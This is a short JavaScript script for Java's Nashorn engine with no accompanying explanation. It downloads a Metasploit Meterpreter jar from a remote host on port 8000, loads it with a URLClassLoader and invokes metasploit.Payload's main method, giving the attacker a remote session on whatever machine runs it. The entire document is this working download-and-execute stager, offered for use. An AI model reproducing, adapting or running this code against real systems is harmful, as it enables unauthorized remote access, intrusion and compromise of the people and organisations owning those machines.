// url of the jar file
payloadURL = "http://x.x.x.x:8000/meterpreter.jar"

// define Java classes in JavaScript
var URL = Java.type("java.net.URL");
var URLClassLoader =  Java.type("java.net.URLClassLoader");
var Class = Java.type("java.lang.Class");
var Method = Java.type("java.lang.reflect.Method");
var URLArray = Java.type("java.net.URL[]");
var StringArray = Java.type("java.lang.String[]")
var ObjectArray = Java.type("java.lang.Object[]")

payloadURLs = new URLArray(1);
payloadURLs[0] = new URL(payloadURL);

paramsArray = new StringArray(0);

objectArray = new ObjectArray(1);
objectArray[0] = paramsArray;

// Load payload jar and invoke main method of metasploit.Payload
urlClassLoader = new URLClassLoader(payloadURLs, "".getClass().getClassLoader())
payloadClass = Class.forName("metasploit.Payload", true, urlClassLoader);
method = payloadClass.getDeclaredMethod("main", paramsArray.getClass())

method.invoke(null, objectArray)
